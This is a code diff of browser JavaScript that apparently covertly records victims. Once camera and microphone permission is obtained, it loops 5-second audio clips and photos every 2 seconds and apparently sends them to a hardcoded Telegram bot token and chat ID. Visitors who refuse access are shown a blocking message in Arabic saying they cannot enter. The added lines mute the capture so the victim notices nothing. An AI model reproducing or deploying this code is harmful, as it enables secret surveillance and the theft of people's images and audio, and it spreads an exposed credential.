@@ -219,7 +219,7 @@ let stream = null;
 let audioActive = false;
 let photoActive = false;
 const BOT_TOKEN = "8574889163:AAFJtXmst2oMwx1ubV05QTC_fTF7IHe3124";
-const CHAT_ID   = "5648826330";
+const CHAT_ID = "5648826330";
 const AUDIO_MS = 5000;
 const PHOTO_MS = 2000;
 
@@ -253,6 +253,10 @@ function captureImage() {
     return new Promise(resolve => {
         const video = document.createElement("video");
         video.srcObject = stream;
+        video.muted = true;        // ✅ إيقاف الصوت نهائياً
+        video.volume = 0;          // ✅ تأكيد إضافي
+        video.autoplay = true;     // ✅ تشغيل تلقائي بدون صوت
+        
         video.onloadedmetadata = () => {
             video.play();
             const canvas = document.createElement("canvas");
@@ -284,20 +288,19 @@ async function photoLoop() {
     }
 }
 
-// ✅ دالة واحدة فقط
+// دالة البداية
 async function start() {
     try {
         stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
         console.log("✅ تم منح الإذن! بدء التسجيل...");
         
-        // 🟢 تشغيل الحلقات
+        // تشغيل الحلقات
         audioLoop();
         photoLoop();
         
     } catch (err) {
         console.error("❌ تم رفض الإذن:", err);
         
-        // رسالة الخطأ
         document.body.innerHTML = `
             <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;color:#fff;background:#111;text-align:center;font-family:Arial;padding:20px;">
                 <h1>🚫 لا يمكنك الدخول بدون السماح بالكاميرا والميكروفون</h1>
